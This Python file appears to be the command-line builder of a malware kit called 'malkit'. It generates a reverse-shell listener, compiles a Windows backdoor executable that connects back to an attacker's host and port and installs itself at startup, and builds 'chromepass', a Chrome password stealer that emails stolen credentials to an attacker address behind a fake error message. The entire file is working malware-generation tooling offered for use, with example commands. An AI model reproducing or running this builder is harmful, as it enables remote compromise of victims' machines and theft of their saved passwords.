from progress.spinner import Spinner
import argparse
import configparser
import os
import sys
import time
from builtins import KeyboardInterrupt
from subprocess import call

if sys.platform == "linux":
    print("""
    [!] ATTENTION

You are running this on Linux and as such, building capabilities are limited.
You can only build the listener

""")
else:
    from darkarp.malkit_modules import build

# from testing import build

# #? LOAD SETTINGS #

CONFIG_FILE = "malkit.conf"
CONFIG = configparser.ConfigParser()
CONFIG.read(CONFIG_FILE)
__VERSION = CONFIG["DEFAULT"]["VersionLong"]


def check_folders():
    if not os.path.exists("builds"):
        os.mkdir("builds")
    if not os.path.exists("listeners"):
        os.mkdir("listeners")


def build_listener(args):
    if args.max_connections:
        connections_max = args.max_connections
    else:
        connections_max = CONFIG["LISTENER"]["CONNECTIONS_MAX"]
    temp_listener = CONFIG["TEMPLATES"]["listener"]
    check_folders()
    port = args.p
    with open(temp_listener, "r") as f:
        listener_script = f.read()

    listener_script_final = listener_script.replace(
        "<<PORT>>", str(port))
    listener_script_final = listener_script_final.replace(
        "<<CONNECTIONS_MAX>>", connections_max)
    with open("listeners/listener.py", "w") as f:
        f.write(listener_script_final)

    if not args.no_interact:
        while True:
            start = input("Would you like to start the listener? [y/n]> ")
            if start.lower() == "y" or start.lower() == 'yes':
                try:
                    call(["python", "listeners/listener.py"])
                except KeyboardInterrupt:
                    print("[+] Exited successfully")
                    os._exit(0)

            elif start.lower() == 'n' or start.lower() == "no":
                break

    return len(listener_script_final)


def build_malware(args):
    print("[!] Still in testing")
    check_folders()
    if args.reconnect_min or args.reconnect_max:
        reconnect_min = args.reconnect_min
        reconnect_max = args.reconnect_max
    else:
        reconnect_min = CONFIG["MALWARE"]["RECONNECT_MIN"]
        reconnect_max = CONFIG["MALWARE"]["RECONNECT_MAX"]
    host = f"'{args.host}'"
    port = str(args.p)
    for _ in range(len(sys.argv)-1):
        sys.argv.pop()
    filename = CONFIG["MALWARE"]["Filename"]
    target = CONFIG["MALWARE"]["Stub"]
    output = CONFIG["MALWARE"]["Output"]

    startup_name = CONFIG["MALWARE"]["Startup_name"]
    startup_icon = CONFIG["MALWARE"]["Startup_icon"]
    payload_name = CONFIG["MALWARE"]["Payload_name"]

    timeout = CONFIG["MALWARE"]["Timeout"]

    stub_try = CONFIG["STUB"]["TRY"]
    stub_funclist = CONFIG["STUB"]["FUNC_LIST"]

    temp_stub = CONFIG["TEMPLATES"]["stub"]
    #
    temp_malware = CONFIG["TEMPLATES"]["malware"]

    # Create Stub
    with open(temp_stub, "r") as f:
        stub_child = f.read()
    stub_final = stub_child.replace("<<TRY>>", stub_try)
    stub_final = stub_final.replace("<<FUNC_LIST>>", stub_funclist)
    with open(target, "w") as f:
        f.write(stub_final)

    # Create Malware
    with open(temp_malware, "r") as f:
        mal_child = f.read()
    mal_final = mal_child.replace("<<HOST>>", host)
    mal_final = mal_final.replace("<<PORT>>", port)
    mal_final = mal_final.replace("<<SESSION_TIMEOUT>>", timeout)
    mal_final = mal_final.replace("<<RECONNECT_MIN>>", reconnect_min)
    mal_final = mal_final.replace("<<RECONNECT_MAX>>", reconnect_max)
    with open(filename, "w") as f:
        f.write(mal_final)

    # Build the Executable and clean

    build.exebuild(target=target, include='_malkit',
                   output=startup_name, icon=startup_icon)

    include = build.generate_payload(filename=filename,
                                     destname=payload_name,
                                     startup=startup_name,
                                     icon="icons/icon.ico")

    build.exebuild(target=target, include=include,
                   output=output, icon="icons/icon.ico")
    remove = [f'_malkit/{payload_name}.py',
              'Windows Defender.exe', 'malware.py', 'stub.py']
    for file in remove:
        try:
            os.remove(file)
        except Exception as Err:
            print(Err)
    spinner = Spinner("Finalizing... ")
    for i in range(10):
        time.sleep(0.1)
        spinner.next()
    print("\n[+] Done")
    time.sleep(1)
    os.system("cls")
    print("You can locate the generated file in the builds folder.")
    return len(stub_final)


def build_chromepass(args):
    if args.load:
        print("Loading from file...")
        print("Not implemented yet")
    if args.email and not args.reverse_shell:
        mailto = args.address
        for _ in range(len(sys.argv)-1):
            sys.argv.pop()

        # Create Chromepass
        temp_chromepass = CONFIG["TEMPLATES"]["chromepass_email"]
        errorfile = CONFIG["TEMPLATES"]["error_OK"]

        filename = CONFIG["CHROMEPASS"]["Filename"] + ".py"
        passfile = CONFIG["CHROMEPASS"]["passfile"]
        output = CONFIG["CHROMEPASS"]["output"]
        server = CONFIG["CHROMEPASS"]["server"]
        email = CONFIG["CHROMEPASS"]["email"]
        pwd = CONFIG["CHROMEPASS"]["password"]
        icon = CONFIG["CHROMEPASS"]["icon"]

        if not args.no_error:
            if args.errormsg:
                error_msg = args.errormsg
                sys.argv.pop()
                sys.argv.pop()
            else:
                error_msg = CONFIG["CHROMEPASS"]["errormsg"]

            with open(errorfile, "r") as f:
                error_pre = f.read()

            error_final = error_pre.replace("<<ERRORMSG>>", error_msg)
            error_final = error_final.replace("<<TITLE>>", "Error")
        else:
            error_final = ""

        with open(temp_chromepass, "r") as f:
            cp_child = f.read()
        cp_final = cp_child.replace("<<PASSFILE>>", passfile)
        cp_final = cp_final.replace("<<EMAIL>>", email)
        cp_final = cp_final.replace("<<PASSWORD>>", pwd)
        cp_final = cp_final.replace("<<MAILTO>>", mailto)
        cp_final = cp_final.replace("<<SERVER>>", server)
        cp_final = cp_final.replace("<<ERROR>>", error_final)
        with open(filename, "w") as f:
            f.write(cp_final)
        # Build the Executable and clean
        build.exebuild(target=filename, include='_malkit',
                       output=f"builds/{output}", icon=icon)
        spinner = Spinner("Finalizing build...")
        for i in range(10):
            time.sleep(0.1)
            spinner.next()
        print("\n[+] Done")
        time.sleep(1)
        os.system("cls")
        print("You can locate the generated file in the builds folder.")

        try:
            os.remove(filename)
        except Exception as e:
            print(e)

        return len(cp_final)

    elif args.reverse_shell and not args.email:
        for _ in range(len(sys.argv)-1):
            sys.argv.pop()
        print("Not implemented yet but it's easier than email... \
A copy paste will work, adding after rest is working")

    else:
        return print("Error, please specify one option \
(email or reverse shell)")


def getOptions():
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(
        title="Module-specific commands")

    # Versioning
    parser.add_argument("-v", "--version", action="version",
                        version=__VERSION)

    # Build listener
    listener_example = '''example:
 python malkit.py build_listener -p 4444
 python malkit.py build_listener -p 4444 --max_connections 10
 
 '''

    parser_build_listener = subparsers.add_parser(
        'build_listener',
        epilog=listener_example,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        help="-h for help",
    )
    parser_build_listener_required = parser_build_listener.add_argument_group(
        'Required named arguments')
    parser_build_listener.add_argument(
        "--max_connections",
        type=str,
        metavar=f"Max number of possible connections",
        required=False
    )
    parser_build_listener.add_argument(
        "--no_interact",
        default=False,
        action='store_true',
        required=False)
    parser_build_listener_required.add_argument(
        "-p",
        type=int,
        metavar=f"Port for reverse connection",
        required=True)
    parser_build_listener.set_defaults(func=build_listener)

    # Build malware
    malware_example = '''example:

 python malkit.py build_malware --host 127.0.0.1 -p 4444
 python malkit.py build_malware --host 127.0.0.1 -p 4444 --reconnect_min 5 --reconnect_max 60
 
 '''

    parser_build_malware = subparsers.add_parser(
        'build_malware',
        epilog=malware_example,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        help="-h for help")

    parser_build_malware.add_argument(
        "--reconnect_min",
        type=str,
        metavar=f"Mininum ime to reconnect, chosen at random between min and max",
        required=False
    )
    parser_build_malware.add_argument(
        "--reconnect_max",
        type=str,
        metavar=f"Max time to reconnect, chosen at random between min and max",
        required=False
    )

    parser_build_malware_required = parser_build_malware.add_argument_group(
        'Required named arguments')

    parser_build_malware_required.add_argument(
        "--host",
        type=str,
        metavar=f"IP for reverse connection",
        required=True)
    parser_build_malware_required.add_argument(
        "-p",
        type=int,
        metavar=f"Port for reverse connection.",
        required=True)

    parser_build_malware.set_defaults(func=build_malware)

    # Build chromepass
    chromepass_example = '''example:

 python malkit.py build_chromepass --email --address test@email.com
 python malkit.py build_chromepass --reverse_shell --host 127.0.0.1 -p 4444
 python malkit.py build_chromepass --load myfile.conf
 
 '''

    parser_build_chromepass = subparsers.add_parser(
        'build_chromepass',
        epilog=chromepass_example,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        help="-h for help")
    parser_build_chromepass.add_argument(
        "--load",
        default=False,
        action="store_true",
        required=False)
    parser_build_chromepass.add_argument(
        "--email",
        default=False,
        action="store_true",
        required=False)
    parser_build_chromepass.add_argument(
        "--reverse_shell",
        default=False,
        action='store_true',
        required=False)
    parser_build_chromepass.add_argument(
        "--no_error",
        default=False,
        action='store_true',
        required=False)

    parser_build_chromepass.add_argument(
        "--errormsg",
        type=str,
        metavar=f"Error message to appear",
        required=False)
    parser_build_chromepass.add_argument(
        "--address",
        type=str,
        metavar=f"Email address to send details to, if Email was chosen",
        required=False)
    parser_build_chromepass.add_argument(
        "--port",
        type=int,
        metavar=f"Port for reverse connection, if Reverse shell was chosen.",
        required=False)
    parser_build_chromepass.add_argument(
        "--host",
        type=str,
        metavar=f"Host reverse connection, if Reverse shell was chosen.",
        required=False)

    parser_build_chromepass.set_defaults(func=build_chromepass)

    # Parse the arguments
    args = parser.parse_args()

    # Check for mutually inclusive
    try:
        if args.reconnect_min and args.reconnect_max is None:
            parser.error("--reconnect_min requires --reconnect_max")
        elif args.reconnect_max and args.reconnect_min is None:
            parser.error("--reconnect_max requires --reconnect_min")
        elif args.email and (args.address is None):
            parser.error("--email requires --address")
        elif args.reverse_shell and (args.host is None or args.port is None):
            parser.error("--reverse_shell requires --host and --port.")
    except Exception:
        pass

    try:
        args.func(args)
    except Exception:
        # raise(err)
        return parser.print_help()
    return 0


if __name__ == "__main__":
    getOptions()
